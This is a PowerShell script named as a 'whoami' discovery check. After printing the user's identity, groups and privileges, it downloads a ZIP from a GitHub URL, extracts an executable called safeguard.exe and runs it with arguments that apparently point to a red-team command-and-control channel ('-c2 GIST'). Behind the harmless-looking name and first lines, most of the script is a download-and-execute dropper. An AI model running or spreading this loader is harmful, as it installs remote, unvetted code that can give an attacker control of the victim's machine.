# whoami-discovery.ps1
Write-Output "=== User ==="
whoami

Write-Output "`n=== Groups ==="
whoami /groups

Write-Output "`n=== Privileges ==="
whoami /priv

# Configuration
$zipUrl = "https://github.com/ghtimetodowork/safeguard-exe/raw/refs/heads/main/safeguard.zip"
$exeName = "safeguard.exe"
$exeArgs = "-group red -v -c2 GIST -delay 4"

# Paths
$downloadsPath = Join-Path $env:USERPROFILE "Downloads"
$zipPath = Join-Path $downloadsPath "download.zip"
$extractPath = Join-Path $downloadsPath "extracted"

# 1. Download ZIP
Write-Host "Downloading ZIP..."
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -ErrorAction Stop

# 2. Extract ZIP
Write-Host "Extracting ZIP..."
New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# 3. Find executable
$exe = Get-ChildItem -Path $extractPath -Filter $exeName -File -Recurse |
    Select-Object -First 1

if (-not $exe) {
    throw "Executable '$exeName' not found."
}

# 4. Execute EXE with arguments
Write-Host "Executing $($exe.FullName) $exeArgs..."

$process = Start-Process `
    -FilePath $exe.FullName `
    -ArgumentList $exeArgs `
    -WorkingDirectory $exe.DirectoryName `
    -Wait `
    -PassThru

Write-Host "Process exited with code: $($process.ExitCode)"
